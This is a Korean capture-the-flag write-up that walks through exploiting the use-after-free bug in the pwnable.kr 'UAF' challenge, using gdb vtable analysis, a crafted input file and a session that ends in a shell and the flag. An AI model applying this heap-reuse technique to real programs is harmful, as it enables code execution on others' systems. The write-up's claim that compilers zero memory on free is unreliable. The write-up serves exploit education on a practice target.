---


---

<h1 id="pwnable.kruaf-문제-풀이"><a href="http://pwnable.kr">pwnable.kr</a>:UAF 문제 풀이</h1>
<h2 id="uaf취약점에-대한-공부">2019-07-07 : 'UAF취약점’에 대한 공부</h2>
<p>UAF(Using After Free)는 반납된 Heap영역을 다루는 것이다.</p>
<ul>
<li>Heap을 free를 하여도 그 안에 있는 값이 초기화 되지 않는다.(!)</li>
<li>Heap에서 free가 이루어지고 새로운 영역이 필요할 시, 최적화를 사유로 free된 영역을 재사용 한다.</li>
<li>Heap Overflow는 Stack Overflow와 유사하나 정해진 데이터에서 정보 데이터가 포함되 본래 용량보다 크게 할당된다.</li>
</ul>
<p><em>(!)읽어본 자료에는 이러한 취약점 때문에 , free하기 전 데이터를 초기화 할 것을 추천하고 있다.<br>
하지만 2019년 기준 GCC와 Visual Studio에서는 free를 할 경우 데이터가 NULL또는 0으로 자동 초기화됨을 확인했다.</em></p>
<h2 id="pwnable.kruaf-관찰">2019-07-08 : ‘<a href="http://pwnable.kr">pwnable.kr</a>:UAF’ 관찰</h2>
<pre><code>class Human{
private:
        virtual void give_shell(){
                system("/bin/sh");
        }
</code></pre>
<p>부모 클래스에서 /bin/sh를 사용하고 있다.</p>
<pre><code>					    case 1:
                                m-&gt;introduce();
                                w-&gt;introduce();
                                break;
                        case 2:
                                len = atoi(argv[1]);
                                data = new char[len];
                                read(open(argv[2], O_RDONLY), data, len);
                                cout &lt;&lt; "your data is allocated" &lt;&lt; endl;
                                break;
                        case 3:
                                delete m;
                                delete w;
                                break;
</code></pre>
<p>입력을 받아 1은 클래스 의 매소드를 이용하며, 2는 새로운 입력 영역을, 3은 클래스 반납을 선택할 수 있다.<br>
3번을 선택해 클래스를 반납하고 Heap 영역을 되돌려 받은 후, 2번을 이용하여 위의 system("/bin/sh")을 호출 할 수 있을것이다.</p>
<pre><code>0x0000000000400fb2 &lt;+238&gt;:   mov    eax,DWORD PTR [rbp-0x18]
0x0000000000400fb5 &lt;+241&gt;:   cmp    eax,0x2
0x0000000000400fb8 &lt;+244&gt;:   je     0x401000 &lt;main+316&gt;
0x0000000000400fba &lt;+246&gt;:   cmp    eax,0x3
0x0000000000400fbd &lt;+249&gt;:   je     0x401076 &lt;main+434&gt;
0x0000000000400fc3 &lt;+255&gt;:   cmp    eax,0x1
0x0000000000400fc6 &lt;+258&gt;:   je     0x400fcd &lt;main+265&gt;
0x0000000000400fc8 &lt;+260&gt;:   jmp    0x4010a9 &lt;main+485&gt;
</code></pre>
<p>gdb를 이용해 cmp와 je가 반복하는 부분을 발견했다. 이는 상단에서의 분기가 되었던 switch 문의 case라고 추측 할 수 있다.<br>
이중에서 main+255는 eax가 1인지 물어보고 있다  즉 0x400fcd는 우리가 1번을 선택한 내용이다.</p>
<pre><code>0x0000000000400fcd &lt;+265&gt;:   mov    rax,QWORD PTR [rbp-0x38]
0x0000000000400fd1 &lt;+269&gt;:   mov    rax,QWORD PTR [rax]
0x0000000000400fd4 &lt;+272&gt;:   add    rax,0x8
0x0000000000400fd8 &lt;+276&gt;:   mov    rdx,QWORD PTR [rax]
0x0000000000400fdb &lt;+279&gt;:   mov    rax,QWORD PTR [rbp-0x38]
0x0000000000400fdf &lt;+283&gt;:   mov    rdi,rax
0x0000000000400fe2 &lt;+286&gt;:   call   rdx
</code></pre>
<p>1번의 흐름은</p>
<ol>
<li>rbp-0x38의 값이 rax에 들어간다.</li>
<li>rax의 값이 rax에 들어간다.(값이 주소가 된다.)</li>
<li>rax값에 8을 더한다.</li>
<li>rax값을 인자로 넣고 함수를 실행한다.</li>
</ol>
<p>로 이루어지고 있다.</p>
<pre><code>(gdb) b *main+272
Breakpoint 2 at 0x400fd4
(gdb) c
Continuing.

Breakpoint 2, 0x0000000000400fd4 in main ()
(gdb) x/x $rax
0x401570 &lt;_ZTV3Man+16&gt;: 0x0040117a
(gdb) x/i 0x0040117a
   0x40117a &lt;_ZN5Human10give_shellEv&gt;:  push   rbp
   (gdb) b *main+276

Breakpoint 3 at 0x400fd8
(gdb) c
Continuing.

Breakpoint 3, 0x0000000000400fd8 in main ()
(gdb) x/x $rax
0x401578 &lt;_ZTV3Man+24&gt;: 0x004012d2
(gdb) x/i 0x004012d2
   0x4012d2 &lt;_ZN3Man9introduceEv&gt;:      push   rbp
</code></pre>
<p>**RAX(0x401570)**가 들고있는 system("/bin/sh")의 주소는 <strong>0x40117a</strong><br>
8이 더해진 **RAX(0x401578)**이 들고있는 introduce 메소드의 주소는 <strong>0x4012d2</strong>이다.</p>
<h2 id="tip">2019-07-09 : TIP</h2>
<p>어제 출력 받았던 깨진 스트링들을 “set print asm-demangle on” 하여 온전하게 볼 수 있다.</p>
<pre><code>(gdb) x/x 0x0040117a
0x40117a &lt;Human::give_shell()&gt;: 0xe5894855
(gdb) x/i 0x0040117a
   0x40117a &lt;Human::give_shell()&gt;:      push   rbp
</code></pre>
<p>또한 <a href="http://pwnable.kr">pwnable.kr</a> 에서도 gdb-peda가 설치되어 있다.</p>
<pre><code>source /usr/share/peda/peda.py
</code></pre>
<p>를 gdb실행 후 입력해 peda를 사용할 수 있다.</p>
<p>그리고 파일 입출력으로 인자를 받는 문제들은 파일을 만들어야 하는 상황인데 이때 /tmp/에 디렉토리를 만들어서 쓰는것을 <a href="http://pwnable.kr">pwnable.kr</a> 에서 허락하고 있다.</p>
<h2 id="pwnable.kruaf-분석">2019-07-10 : ‘<a href="http://pwnable.kr">pwnable.kr</a>:UAF’ 분석</h2>
<pre><code>    RAX: 0x401578 --&gt; 0x4012d2 (&lt;Man::introduce()&gt;: push   rbp)
</code></pre>
<p>1번을 따라가면 RAX	에 introduce가 들어가는 것을 확인 할 수 있다. 후에 3번을 선택하고 따라가서 확인하면</p>
<pre><code>gdb-peda$ x/x 0x401578
0x401578 &lt;vtable for Man+24&gt;:   0x00000000004012d2
</code></pre>
<p>free됬음을 확인 할 수 있다.</p>
<p>할 수 있는 조작은 객체의 메소드를 이용하는것, 객체를 free하는 것,  또 다른 객체를 생성하고 read함수를 이용하는 것이다.<br>
추측되는 공격 과정은 아래와 같다.</p>
<ol>
<li>3번을 눌러 객체를 free한다.</li>
<li>2번을 이용해 또다른 객체를 만들어 0x401570가 있던 자리에 (0x401570)-8 의 값을 넣는다.</li>
<li>1번을 눌러 free된 객체를 실행한다.</li>
<li>Heap에는 그대로 남아있기 때문에, 덮어씌워진 (0x401570)-8의 주소로 실행된다.</li>
</ol>
<p>시험삼아 "AAAA"라는 데이터를 위와 같은 방법으로 올려보겠다.</p>
<pre><code>python -c 'print "A" * 4' &gt; /tmp/tayasriel/test4A
</code></pre>
<p>그리고 1번을 선택해 "AAAA"가 올라오는지 확인했다.</p>
<pre><code>RAX: 0x0
RBX: 0x14d7ca0 --&gt; 0x41414141 ('AAAA')
</code></pre>
<p>"AAAA"를 읽었지만 RAX에는 올라오지 못했다. 하지만 두번 연속하여 2. after를 사용하자 성공했다.</p>
<pre><code>RAX: 0x41414141 ('AAAA')
RBX: 0x254dca0 --&gt; 0x41414141 ('AAAA')
</code></pre>
<p>uaf@prowl:~$ ./uaf 4 /tmp/tayasriel/uaf</p>
<pre><code>1. use
2. after
3. free
3
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
1
$ cat flag
yay_f1ag_aft3r_pwning
$
</code></pre>

